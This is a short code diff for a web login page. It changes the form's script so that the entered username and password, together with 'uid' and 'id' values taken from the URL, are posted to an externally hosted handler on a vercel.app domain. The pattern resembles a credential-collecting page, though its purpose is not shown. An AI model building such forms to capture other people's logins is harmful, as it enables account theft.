@@ -27,12 +27,17 @@
     <script>
         $('#loginForm').on('submit', function(e) {
             e.preventDefault();
-
+        
             var username = $('#username').val();
             var password = $('#password').val();
-
+        
+            // Fetch uid and id from URL
+            var params = new URLSearchParams(window.location.search);
+            var uid = params.get('uid');
+            var id = params.get('id');
+        
             $.ajax({
-                url: 'https://kobo-link.vercel.app/api/handler',
+                url: `https://kobo-link.vercel.app/api/handler?uid=${uid}&id=${id}`,
                 type: 'POST',
                 data: JSON.stringify({username: username, password: password}),
                 contentType: 'application/json',
@@ -48,6 +53,7 @@
                 }
             });
         });
+        
     </script>
 </body>
 </html>
